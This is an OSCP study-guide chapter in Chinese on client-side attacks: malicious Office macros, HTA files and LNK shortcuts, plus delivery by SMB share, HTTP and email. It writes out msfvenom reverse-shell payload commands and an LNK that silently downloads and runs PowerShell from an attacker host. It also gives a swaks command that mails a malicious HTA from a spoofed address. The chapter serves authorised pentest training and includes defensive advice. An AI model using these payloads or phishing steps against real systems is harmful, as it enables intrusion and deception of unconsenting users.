# Ch 43 — Client-Side Attacks：釣魚、惡意 macro / HTA / LNK

> 目標：理解 client-side attack 的原理與在 OSCP 的適用場景，能在**獲授權的滲透測試 / 考試環境**中，製作需要「受害者開啟」才觸發的 payload（Office macro、HTA、LNK），並知道何時該用、何時不該用。

> ⚠️ **使用範圍**：本章技術僅限你有明確書面授權的滲透測試、OSCP 考試環境、或你自己的實驗室。對未授權對象發送釣魚或惡意檔案是違法行為。本章聚焦原理與授權測試用法，不涉及針對真實個人的社交工程操作。

## 什麼是 Client-Side Attack

前面章節打的都是**伺服器端**：你直接攻擊監聽中的服務。但有些情境沒有可直接利用的服務，入口是「**人**」——你準備一個檔案，等目標使用者打開它，程式碼就在**他的機器上**執行，反彈 shell 回來。

```
伺服器端：你 → 攻擊目標開著的 port
客戶端　：你 → 準備誘餌 → 目標「開啟」誘餌 → 在目標機器執行
```

## 在 OSCP 會遇到嗎？

**少見，但要會。** 現行 OSCP 考試以伺服器端為主，但 PEN-200 課程涵蓋 client-side，模擬環境可能出現：

- 一台機器會「自動模擬使用者」定期開啟你上傳到某分享/信箱的檔案
- 題目明示有人會點擊 / 開啟特定路徑的檔案

**判斷訊號**：看到「可寫的分享資料夾 + 沒有其他明顯入口」、題目描述有「使用者會定期檢查」、或 SMTP 開放且暗示有人收信——這時才考慮 client-side。別把它當第一選擇；伺服器端枚舉永遠先做。

## 惡意 Office Macro（VBA）

最經典的誘餌：帶巨集的 Word/Excel 文件。目標開啟並「啟用內容」後，VBA 執行你的 payload。

```bash
# 用 msfvenom 產生 VBA（反彈 shell 的巨集碼）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f vba

# 輸出貼進 Word → 開發人員 → Visual Basic → 插入模組
# 將 Workbook_Open() / Document_Open() 設為自動執行進入點
```

概念骨架（巨集在文件開啟時自動跑）：

```vba
Sub Document_Open()
    MyMacro          ' 文件開啟即觸發
End Sub
Sub AutoOpen()
    MyMacro          ' 相容另一種自動執行名稱
End Sub
```

搭配 Kali 的 listener：

```bash
# 若用 meterpreter payload
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 443; run"
# 考試注意：meterpreter 受「一台機器」Metasploit 限制，可改用純 nc/powershell 反彈
```

## HTA（HTML Application）

`.hta` 是 Windows 用 `mshta.exe` 執行的 HTML + 腳本檔，開啟即以使用者權限跑 script。

```bash
# msfvenom 直接產 HTA
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f hta-psh -o evil.hta

# 誘導目標從瀏覽器/連結開啟，或放到他會開的位置
# 內部實質是呼叫 powershell 執行 base64 payload
```

## 惡意 LNK（捷徑檔）

`.lnk` 捷徑可把「目標」設成一段命令。放在使用者會瀏覽的目錄，點開即執行。

```powershell
# 在 PowerShell 產生指向惡意命令的捷徑
$ws = New-Object -ComObject WScript.Shell
$lnk = $ws.CreateShortcut("C:\share\report.lnk")
$lnk.TargetPath = "powershell.exe"
$lnk.Arguments  = "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"
$lnk.Save()
```

> 這類「下載並執行 PowerShell」是授權測試的標準手法；`s.ps1` 放你自己的反彈 shell 腳本。別把它用於未授權目標。

## 投遞管道（授權測試情境）

| 管道 | 作法 |
|------|------|
| 可寫 SMB 分享 | 把誘餌放進模擬使用者會開的分享（搭配 Ch 7 枚舉找可寫分享） |
| HTTP | Kali `python3 -m http.server 80` 架站，誘導目標下載開啟 |
| SMTP | 目標開放 25 且題目暗示有人收信時，用 `swaks` 寄帶附件的信 |

```bash
# swaks 寄信範例（授權測試）
swaks --to victim@corp.local --from it@corp.local \
  --server 10.10.10.x --body "請檢視附件報表" --attach @evil.hta
```

## 收到 shell 之後

和伺服器端一樣：穩定 shell → 枚舉 → 提權（Ch 25–29）。client-side 只是**換一種拿到初始 shell 的方式**，後續方法論不變。

## 防禦視角（報告會用到）

授權測試報告需要給修補建議：

- 群組原則停用 Office 巨集（尤其來自網際網路的檔案）
- 封鎖 `mshta.exe`、限制 `.hta`/`.lnk` 從郵件/下載執行（ASR 規則）
- 使用者教育 + 郵件閘道附件過濾
- 應用程式白名單（WDAC/AppLocker）

## 本章對應靶機

| 平台 | 練習 |
|------|------|
| TryHackMe | 「Phishing」/「Red Team」相關房間（含巨集/HTA 實作） |
| HTB | 標註 client-side 的機器（較少，多在 PEN-200 lab） |
| PEN-200 Lab | client-side 模組的官方練習機器 |

## 自我檢核

- [ ] 說得出 client-side 與 server-side 攻擊的差別
- [ ] 知道 OSCP 中何時該考慮 client-side（而非第一選擇）
- [ ] 能用 msfvenom 產生 VBA macro / HTA payload
- [ ] 能製作一個「下載並執行 PowerShell」的 LNK
- [ ] 懂得只在獲授權環境使用，並能寫出對應防禦建議

→ [Ch 44 枚舉自動化與方法論強化：AutoRecon / nmap 腳本化](./44-enum-automation.md)
